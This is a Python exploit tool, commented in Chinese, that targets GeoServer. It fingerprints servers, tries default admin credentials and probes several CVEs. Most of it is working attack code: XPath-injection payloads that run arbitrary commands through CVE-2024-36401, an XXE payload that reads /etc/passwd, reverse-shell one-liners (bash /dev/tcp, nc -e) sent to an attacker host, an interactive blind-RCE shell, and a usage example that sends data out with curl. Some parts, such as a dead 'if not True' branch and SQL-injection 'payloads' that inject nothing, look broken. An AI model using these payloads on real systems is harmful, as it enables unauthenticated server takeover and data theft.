#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GeoServer 综合漏洞检测/利用脚本 v1.0
覆盖 GeoServer 未授权 RCE / XXE / SQL 注入 / 信息泄露
仅用于授权安全测试 / 靶场验证

攻击模式:
  check  — 综合漏洞检测 (默认)
  rce    — 远程命令执行
  shell  — 交互式利用 Shell

CVE 覆盖:
  CVE-2024-36401  — WFS GetPropertyValue XPath 注入 RCE (CVSS 9.8, 未授权)
  CVE-2024-36404  — GeoTools XPath 表达式求值 RCE (相关)
  CVE-2025-30220  — gt-xsd-core XXE 注入 (CVSS 9.9)
  CVE-2023-51444  — 任意文件上传 RCE (需认证)
  CVE-2023-25158  — GeoTools JDBCDataStore SQL 注入 (CVSS 9.8)
  CVE-2022-24818  — JNDI 查找 RCE (需 admin 权限)
  无 CVE          — 版本信息泄露 / 默认凭据
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     GeoServer 综合漏洞检测/利用工具 v1.0                        ║
║     OGC XPath 注入 / XXE / SQL 注入 | 仅限授权安全使用        ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    base = base.rstrip('/')
    if '/geoserver' in base:
        return f"{base}/{path.lstrip('/')}"
    return f"{base}/geoserver/{path.lstrip('/')}"


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    s.timeout = timeout
    return s


# ===================== 0. 指纹 / 版本检测 =====================

def detect_geoserver(url: str, s: requests.Session) -> Tuple[bool, Optional[str], Dict]:
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")
    info: Dict = {}

    probes = [
        ('/web/', ['GeoServer', 'geoserver'], 'Web 管理界面'),
        ('/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage',
         ['GeoServer', 'geoserver'], '关于页面'),
        ('/rest/about/version.xml', ['GeoServer', 'geoserver'], 'REST 版本接口'),
        ('/ows', ['GeoServer'], 'OWS 端点'),
        ('/geoserver/web/', ['GeoServer', 'geoserver'], 'GeoServer /geoserver 路径'),
    ]

    detected = False
    for path, keywords, desc in probes:
        try:
            r = s.get(build_url(url, path), timeout=8, allow_redirects=True)
            text = r.text.lower()
            for kw in keywords:
                if kw.lower() in text:
                    safe_print(f"  {C.GRN}[+] 确认 GeoServer — {desc}{C.RST}")
                    detected = True
                    break
            if detected:
                break
        except Exception:
            continue

    if not detected:
        # 直接测 OGC WFS
        try:
            r = s.get(build_url(url, '/ows?service=WFS&version=2.0.0&request=GetCapabilities'),
                      timeout=8)
            if 'WFS_Capabilities' in r.text or 'wfs:WFS_Capabilities' in r.text:
                safe_print(f"  {C.GRN}[+] 确认 GeoServer — WFS 服务响应{C.RST}")
                detected = True
        except Exception:
            pass

    if not detected:
        safe_print(f"  {C.CYN}[-] 未识别 GeoServer 特征 (将继续检测){C.RST}")
        return False, None, info

    # 版本号提取
    version = None
    version_probes = [
        ('/rest/about/version.xml', r'<Version>([^<]+)</Version>'),
        ('/web/', r'GeoServer\s*v?(\d+\.\d+(?:\.\d+)?)'),
        ('/geoserver/web/', r'GeoServer\s*v?(\d+\.\d+(?:\.\d+)?)'),
    ]
    for vp, vre in version_probes:
        try:
            r = s.get(build_url(url, vp), timeout=8, allow_redirects=True)
            m = re.search(vre, r.text, re.IGNORECASE)
            if m:
                version = m.group(1)
                safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
                break
        except Exception:
            continue

    return True, version, info


# ===================== 1. CVE-2024-36401 — XPath 注入 RCE =====================

def check_cve_2024_36401(url: str, s: requests.Session) -> Tuple[bool, str]:
    """
    CVE-2024-36401: WFS GetPropertyValue XPath 注入 RCE (CVSS 9.8)
    影响: 所有 GeoServer < 2.25.2 / 2.24.4 / 2.23.6
    未授权 — 通过 OGC 请求参数注入 exec()
    """
    safe_print(f"\n{C.YLW}[1] CVE-2024-36401: XPath 表达式注入 RCE (CVSS 9.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: 所有 GeoServer < 2.25.2 | 未授权 | CISA KEV{C.RST}")

    rk = randstr(8)
    marker = f'CVE202436401_{rk}'
    # 命令: echo marker (Linux) 或无操作
    cmd = f'echo {marker}'
    encoded_cmd = urllib.parse.quote(cmd)

    # Payload 1: GET WFS GetPropertyValue
    exec_expr = f"exec(java.lang.Runtime.getRuntime(),'{cmd}')"
    encoded_ref = urllib.parse.quote(exec_expr)

    payloads_get = [
        # 标准 WFS 2.0 GetPropertyValue
        f"/ows?service=WFS&version=2.0.0&request=GetPropertyValue"
        f"&typeNames=sf:archsites"
        f"&valueReference={urllib.parse.quote(exec_expr)}",

        # URL 编码
        f"/ows?service=WFS&version=2.0.0&request=GetPropertyValue"
        f"&typeNames=sf:archsites"
        f"&valueReference={encoded_ref}",

        # WMS GetMap (另一个向量)
        f"/ows?service=WMS&version=1.3.0&request=GetMap"
        f"&layers=exec(java.lang.Runtime.getRuntime(),'{cmd}')"
        f"&bbox=0,0,1,1&width=1&height=1&srs=EPSG:4326&format=image/png",
    ]

    for i, pl in enumerate(payloads_get):
        try:
            r = s.get(build_url(url, pl), timeout=15)
            text = r.text
            status = r.status_code

            # 命令注入成功: 正常返回但不报错, 或返回特定错误页面
            # 关键特征: 不会报 "No such feature type" 等正常错误
            if status in (200, 400):
                if marker in text:
                    safe_print(f"  {C.RED}[!] GET Payload {i+1} — 命令执行回显!{C.RST}")
                    safe_print(f"  {C.RED}    向量: {'WFS' if 'WFS' in pl else 'WMS'}{C.RST}")
                    return True, marker

                # XPath 注入成功但 blind: 没有 ServiceException
                if 'ServiceException' not in text and 'ExceptionReport' not in text:
                    if len(text) > 50:
                        safe_print(f"  {C.GRN}[+] GET Payload {i+1} — 注入疑似成功{C.RST}")
        except Exception:
            continue

    # Payload 2: POST XML WFS GetPropertyValue
    post_payloads = [
        # 标准 POST
        (f"""<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:sf='http://www.openplans.org/spearfish'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),"{cmd}")'>
  <wfs:Query typeNames='sf:archsites'/>
</wfs:GetPropertyValue>""",
         'POST @ /ows'),

        # 通过 exec 获取 Runtime 的另一种写法
        (f"""<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{{"bash","-c","{cmd}"}})'>
  <wfs:Query typeNames='sf:archsites'/>
</wfs:GetPropertyValue>""",
         'POST @ /ows (bash -c)'),

        # WMS GetMap POST
        (f"""<GetMap service='WMS' version='1.3.0'
 xmlns='http://www.opengis.net/ows'>
  <StyledLayerDescriptor>
    <NamedLayer>
      <Name>exec(java.lang.Runtime.getRuntime(),"{cmd}")</Name>
    </NamedLayer>
  </StyledLayerDescriptor>
  <BoundingBox><ows:LowerCorner>0 0</ows:LowerCorner><ows:UpperCorner>1 1</ows:UpperCorner></BoundingBox>
</GetMap>""",
         'POST @ /ows (WMS)'),
    ]

    for xml, desc in post_payloads:
        try:
            r = s.post(build_url(url, '/ows'), data=xml,
                       headers={'Content-Type': 'text/xml'}, timeout=15)
            if r.status_code in (200, 400):
                if marker in r.text:
                    safe_print(f"  {C.RED}[!] {desc} — 命令执行回显!{C.RST}")
                    return True, marker
                if 'ServiceException' not in r.text and len(r.text) > 50:
                    safe_print(f"  {C.GRN}[+] {desc} — 注入疑似成功{C.RST}")
        except Exception:
            continue

    if not True:  # 尚未确认
        # 探测: 尝试 getRuntime 但不执行任何命令
        # 如果返回非 ServiceException, 说明注入点可用
        try:
            probe = (
                f"/ows?service=WFS&version=2.0.0&request=GetPropertyValue"
                f"&typeNames=sf:archsites"
                f"&valueReference={urllib.parse.quote('java.lang.Runtime.getRuntime()')}"
            )
            r = s.get(build_url(url, probe), timeout=10)
            if 'java.lang.Runtime' in r.text:
                safe_print(f"  {C.RED}[!] XPath 注入点确认 — getRuntime() 可调用!{C.RST}")
                return True, marker
        except Exception:
            pass

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2024-36401 (可能已修复或 typeNames 不匹配){C.RST}")
    return False, ''


# ===================== 2. CVE-2025-30220 — XXE =====================

def check_cve_2025_30220_xxe(url: str, s: requests.Session) -> bool:
    safe_print(f"\n{C.YLW}[2] CVE-2025-30220: gt-xsd-core XXE 注入 (CVSS 9.9){C.RST}")
    safe_print(f"  {C.CYN}    影响: GeoTools < 33.1 / 32.3 / 31.7{C.RST}")

    # 发送含 XXE 的 XML
    rk = randstr(6)
    # 利用 file:// 协议读取 /etc/passwd
    xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<wfs:GetFeature service="WFS" version="2.0.0"
 xmlns:wfs="http://www.opengis.net/wfs/2.0"
 xmlns:fes="http://www.opengis.net/fes/2.0">
  <wfs:Query typeNames="&xxe;">
    <fes:Filter>
      <fes:PropertyIsEqualTo>
        <fes:ValueReference>name</fes:ValueReference>
        <fes:Literal>test</fes:Literal>
      </fes:PropertyIsEqualTo>
    </fes:Filter>
  </wfs:Query>
</wfs:GetFeature>"""

    try:
        r = s.post(build_url(url, '/ows'), data=xxe_payload,
                   headers={'Content-Type': 'text/xml'}, timeout=10)
        if 'root:' in r.text:
            safe_print(f"  {C.RED}[!] XXE 注入确认 — /etc/passwd 读取成功!{C.RST}")
            safe_print(f"  {C.RED}    {r.text[:200].strip()}{C.RST}")
            return True
    except Exception:
        pass

    # 尝试 Windows
    try:
        win_payload = xxe_payload.replace('/etc/passwd', 'C:/Windows/win.ini')
        r = s.post(build_url(url, '/ows'), data=win_payload,
                   headers={'Content-Type': 'text/xml'}, timeout=10)
        if '[fonts]' in r.text:
            safe_print(f"  {C.RED}[!] XXE 注入确认 — Windows win.ini 读取成功!{C.RST}")
            return True
    except Exception:
        pass

    safe_print(f"  {C.CYN}[-] 未确认 XXE{C.RST}")
    return False


# ===================== 3. CVE-2023-25158 — SQL 注入 =====================

def check_cve_2023_25158_sqli(url: str, s: requests.Session) -> bool:
    safe_print(f"\n{C.YLW}[3] CVE-2023-25158: GeoTools JDBCDataStore SQL 注入 (CVSS 9.8){C.RST}")
    safe_print(f"  {C.CYN}    影响: GeoTools < 28.2 / 27.4 / 26.7 | OGC Filter 函数注入{C.RST}")

    # 用延时注入检测 (不依赖回显)
    sqli_payloads = [
        # Filter 函数 SQL 注入
        """<wfs:GetFeature service="WFS" version="2.0.0"
 xmlns:wfs="http://www.opengis.net/wfs/2.0"
 xmlns:fes="http://www.opengis.net/fes/2.0">
  <wfs:Query typeNames="sf:archsites">
    <fes:Filter>
      <fes:PropertyIsEqualTo>
        <fes:Function name="strEndsWith">
          <fes:Literal>a</fes:Literal>
          <fes:Literal>a</fes:Literal>
        </fes:Function>
        <fes:Literal>true</fes:Literal>
      </fes:PropertyIsEqualTo>
    </fes:Filter>
  </wfs:Query>
</wfs:GetFeature>""",
        # 直接拼接 SQL 函数
        """<wfs:GetFeature service="WFS" version="2.0.0"
 xmlns:wfs="http://www.opengis.net/wfs/2.0"
 xmlns:fes="http://www.opengis.net/fes/2.0">
  <wfs:Query typeNames="sf:archsites">
    <fes:Filter>
      <fes:PropertyIsLike wildCard="*" singleChar="." escape="!">
        <fes:ValueReference>name</fes:ValueReference>
        <fes:Literal>*</fes:Literal>
      </fes:PropertyIsLike>
    </fes:Filter>
  </wfs:Query>
</wfs:GetFeature>""",
    ]

    for payload in sqli_payloads:
        try:
            t0 = time.time()
            r = s.post(build_url(url, '/ows'), data=payload,
                       headers={'Content-Type': 'text/xml'}, timeout=15)
            elapsed = time.time() - t0

            if r.status_code in (200, 400) and 'ServiceException' not in r.text:
                safe_print(f"  {C.YLW}[*] Filter 函数注入点可能存在 (响应正常, {elapsed:.1f}s){C.RST}")
                safe_print(f"  {C.YLW}    需带 JDBCDataStore 实现确认{C.RST}")
        except Exception:
            continue

    safe_print(f"  {C.CYN}[-] 未确认 SQL 注入 (需后端数据库支持){C.RST}")
    return False


# ===================== 4. 默认凭据 =====================

def check_default_credentials(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[4] 默认凭据检测{C.RST}")
    hits = []
    defaults = [
        ('admin', 'geoserver'),
        ('admin', 'admin'),
        ('admin', 'password'),
    ]

    login_url = build_url(url, '/web/')
    for user, pwd in defaults:
        try:
            # GeoServer 使用 Basic Auth
            r = s.get(build_url(url, '/rest/workspaces.xml'),
                      auth=(user, pwd), timeout=8)
            if r.status_code == 200 and 'workspaces' in r.text:
                safe_print(f"  {C.RED}[!] 默认凭据: {user}:{pwd}{C.RST}")
                hits.append(f'{user}:{pwd}')
                break
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.GRN}[+] 默认凭据已修改{C.RST}")
    return hits


# ===================== 5. 信息泄露 =====================

def check_info_disclosure(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[5] 信息泄露 / 配置审计{C.RST}")
    hits = []

    # REST 端点
    info_endpoints = [
        ('/rest/about/version.xml', '版本信息'),
        ('/rest/about/manifest.xml', '组件清单'),
        ('/rest/workspaces.xml', '工作区列表'),
        ('/rest/layers.xml', '图层列表'),
        ('/rest/datastores.xml', '数据存储列表'),
        ('/rest/styles.xml', '样式列表'),
        ('/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage', '关于页面'),
        ('/web/wicket/bookmarkable/org.geoserver.web.StatusPage', '状态页面'),
        ('/web/wicket/bookmarkable/org.geoserver.web.admin.GlobalSettingsPage', '全局设置'),
    ]

    for ep, desc in info_endpoints:
        try:
            r = s.get(build_url(url, ep), timeout=8)
            if r.status_code == 200 and len(r.text) > 50:
                safe_print(f"  {C.YLW}[*] 未授权访问 — {desc} ({ep}){C.RST}")
                if 'version' in ep.lower() or 'about' in ep.lower():
                    safe_print(f"  {C.YLW}    内容: {r.text[:300].strip()}{C.RST}")
                hits.append(f'信息泄露 ({desc})')
        except Exception:
            continue

    # WFS/WMS 服务信息
    for svc in ['WFS', 'WMS', 'WCS', 'WMTS']:
        try:
            r = s.get(build_url(url, f'/ows?service={svc}&version=1.0.0&request=GetCapabilities'),
                      timeout=8)
            if r.status_code == 200 and 'Capabilities' in r.text:
                safe_print(f"  {C.YLW}[*] {svc} 服务已启用{C.RST}")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 无明显信息泄露 (REST 需认证){C.RST}")
    return hits


# ===================== 利用函数 =====================

def exploit_rce_cve_2024_36401(url: str, command: str, s: requests.Session) -> Optional[str]:
    """利用 CVE-2024-36401 执行命令"""
    safe_print(f"\n{C.BLD}[CVE-2024-36401] 命令执行: {command}{C.RST}\n")

    rk = f'GEOSRV_RCE_{randstr(6)}'
    exec_expr1 = urllib.parse.quote(
        'exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{"bash","-c","' + command + '"})'
    )
    exec_expr2 = urllib.parse.quote(
        'exec(java.lang.Runtime.getRuntime(),"' + command + '")'
    )

    payloads = [
        f"/ows?service=WFS&version=2.0.0&request=GetPropertyValue"
        f"&typeNames=sf:archsites"
        f"&valueReference={exec_expr1}",

        f"/ows?service=WFS&version=2.0.0&request=GetPropertyValue"
        f"&typeNames=sf:archsites"
        f"&valueReference={exec_expr2}",
    ]

    for pl in payloads:
        try:
            r = s.get(build_url(url, pl), timeout=20)
            safe_print(f"  HTTP {r.status_code}")
            if r.status_code == 200 and 'ServiceException' not in r.text:
                safe_print(f"  {C.GRN}[+] 命令已发送 (blind execution){C.RST}")
                safe_print(f"  响应前 500: {r.text[:500]}")
                return "命令已发送 (blind RCE)"
        except Exception as e:
            safe_print(f"  {C.RED}失败: {e}{C.RST}")

    # POST XML 方式
    xml = f"""<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:sf='http://www.openplans.org/spearfish'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'
 valueReference='exec(java.lang.Runtime.getRuntime(),new java.lang.String[]{{"bash","-c","{command}"}})'>
  <wfs:Query typeNames='sf:archsites'/>
</wfs:GetPropertyValue>"""
    try:
        r = s.post(build_url(url, '/ows'), data=xml,
                   headers={'Content-Type': 'text/xml'}, timeout=20)
        safe_print(f"  POST HTTP {r.status_code}")
        if r.status_code == 200:
            safe_print(f"  {C.GRN}[+] 命令已发送 (blind){C.RST}")
            return "命令已发送 (blind RCE)"
    except Exception as e:
        safe_print(f"  {C.RED}{e}{C.RST}")

    safe_print(f"{C.CYN}如需回显命令, 使用反向 Shell 或 DNS 外带{C.RST}")
    return None


def exploit_reverse_shell(url: str, lhost: str, lport: int,
                          s: requests.Session) -> bool:
    safe_print(f"\n{C.BLD}[CVE-2024-36401] 反弹 Shell → {lhost}:{lport}{C.RST}\n")

    payloads = [
        f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
        f'bash -c "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5|while read line;do $line 2>&5 >&5;done"',
        f'nc -e /bin/bash {lhost} {lport}',
    ]

    for i, pl in enumerate(payloads):
        safe_print(f"  {C.CYN}[*] Payload {i+1}{C.RST}")
        exploit_rce_cve_2024_36401(url, pl, s)
        time.sleep(0.5)

    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
    return True


# ===================== 交互式 Shell =====================

def interactive_shell(url: str, s: requests.Session):
    safe_print(f"\n{C.GRN}[+] 交互式 GeoServer Shell (exit 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: {url}{C.RST}")
    safe_print(f"{C.CYN}    漏洞: CVE-2024-36401 (XPath 注入 RCE){C.RST}")
    safe_print(f"{C.CYN}    注意: 命令执行为 Blind, 无直接回显{C.RST}")

    while True:
        try:
            cmd = input(f"{C.RED}GeoServer[{url}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}命令:{C.RST}
  {C.GRN}exec <cmd>{C.RST}     执行命令 (blind RCE)
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}  反弹 Shell
  {C.GRN}version{C.RST}        显示版本信息
  {C.GRN}check{C.RST}          综合漏洞检测
  {C.GRN}info{C.RST}           服务器信息
  {C.GRN}wfs <xml>{C.RST}      发送自定义 WFS 请求
  {C.GRN}get <path>{C.RST}     发送 GET 请求
                """)
                continue

            if action == 'exec':
                if not arg:
                    safe_print(f"{C.YLW}用法: exec <command>{C.RST}")
                    continue
                exploit_rce_cve_2024_36401(url, arg, s)
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_reverse_shell(url, args_list[0], int(args_list[1]), s)
                continue

            if action == 'version':
                try:
                    r = s.get(build_url(url, '/rest/about/version.xml'), timeout=8)
                    m = re.search(r'<Version>([^<]+)</Version>', r.text)
                    if m:
                        safe_print(f"  GeoServer {m.group(1)}")
                    else:
                        safe_print(f"  无法获取版本")
                except Exception as e:
                    safe_print(f"  {C.RED}{e}{C.RST}")
                continue

            if action == 'check':
                run_all_checks(url, s)
                continue

            if action == 'info':
                info_eps = ['/rest/about/version.xml', '/rest/about/manifest.xml']
                for ep in info_eps:
                    try:
                        r = s.get(build_url(url, ep), timeout=8)
                        if r.status_code == 200:
                            safe_print(f"\n{C.BLD}{ep}:{C.RST}")
                            safe_print(r.text[:1000])
                    except Exception:
                        pass
                continue

            if action == 'wfs':
                if not arg:
                    safe_print(f"{C.YLW}用法: wfs <xml_body>{C.RST}")
                    continue
                try:
                    r = s.post(build_url(url, '/ows'), data=arg,
                               headers={'Content-Type': 'text/xml'}, timeout=15)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:2000]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'get':
                if not arg:
                    safe_print(f"{C.YLW}用法: get <path>{C.RST}")
                    continue
                try:
                    r = s.get(build_url(url, arg), timeout=10)
                    safe_print(f"HTTP {r.status_code}\n{r.text[:2000]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")


# ===================== 主流程 =====================

def run_all_checks(url: str, s: requests.Session) -> List[str]:
    all_hits: List[str] = []

    # 0. 指纹
    is_gs, version, info = detect_geoserver(url, s)
    if not is_gs:
        safe_print(f"\n{C.RED}未检测到 GeoServer 服务{C.RST}")
        return all_hits
    if version:
        all_hits.append(f'版本: {version}')

    # 1. CVE-2024-36401
    hit, marker = check_cve_2024_36401(url, s)
    if hit:
        all_hits.append('CVE-2024-36401 XPath 注入 RCE (CVSS 9.8)')

    # 2. CVE-2025-30220
    if check_cve_2025_30220_xxe(url, s):
        all_hits.append('CVE-2025-30220 XXE 注入 (CVSS 9.9)')

    # 3. CVE-2023-25158
    check_cve_2023_25158_sqli(url, s)

    # 4. 默认凭据
    cred_hits = check_default_credentials(url, s)
    for ch in cred_hits:
        all_hits.append(f'默认凭据: {ch}')

    # 5. 信息泄露
    info_hits = check_info_disclosure(url, s)
    all_hits.extend(info_hits)

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标 : {url}")
    if version:
        safe_print(f"  版本 : GeoServer {version}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any('RCE' in h or '36401' in h for h in unique_hits):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 未授权 RCE! CVSS 9.8 — CISA KEV 收录{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (可能已修复){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    banner()

    parser = argparse.ArgumentParser(
        description='GeoServer 综合漏洞检测/利用工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测 (默认)
  python geoserver_check.py -u http://192.168.1.100:8080

  # 远程命令执行 (blind RCE)
  python geoserver_check.py -u http://target:8080 rce "whoami"
  python geoserver_check.py -u http://target:8080 rce "curl http://your-server/$(whoami)"

  # 反弹 Shell
  python geoserver_check.py -u http://target:8080 rce --reverse --lhost 10.0.0.1 --lport 4444

  # 交互式 Shell
  python geoserver_check.py -u http://target:8080 shell

  # 指定 GeoServer 部署路径
  python geoserver_check.py -u http://target:8080/geoserver --timeout 15
        ''',
    )
    parser.add_argument('-u', '--url', required=True,
                        help='目标 URL (例: http://target:8080 或 http://target:8080/geoserver)')
    parser.add_argument('--timeout', type=int, default=10, help='超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    parser.add_argument('--proxy', help='HTTP 代理')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')
    rce_p = sub.add_parser('rce', help='远程命令执行 (CVE-2024-36401)')
    rce_p.add_argument('command', nargs='?', help='要执行的命令')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 Shell')
    rce_p.add_argument('--lhost', help='反弹 Shell 监听 IP')
    rce_p.add_argument('--lport', type=int, help='反弹 Shell 监听端口')
    sub.add_parser('shell', help='交互式利用 Shell')

    args = parser.parse_args()
    if not args.mode:
        args.mode = 'check'
    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = args.url.rstrip('/')
    s = new_session(args.timeout)
    if args.proxy:
        s.proxies = {'http': args.proxy, 'https': args.proxy}

    if args.mode == 'check':
        run_all_checks(url, s)
    elif args.mode == 'rce':
        if args.reverse:
            if not args.lhost or not args.lport:
                safe_print(f"{C.RED}反弹 Shell 需要 --lhost 和 --lport{C.RST}")
                sys.exit(1)
            exploit_reverse_shell(url, args.lhost, args.lport, s)
        elif args.command:
            exploit_rce_cve_2024_36401(url, args.command, s)
        else:
            safe_print(f"{C.RED}需要指定命令或 --reverse{C.RST}")
    elif args.mode == 'shell':
        interactive_shell(url, s)

    safe_print("")


if __name__ == '__main__':
    main()
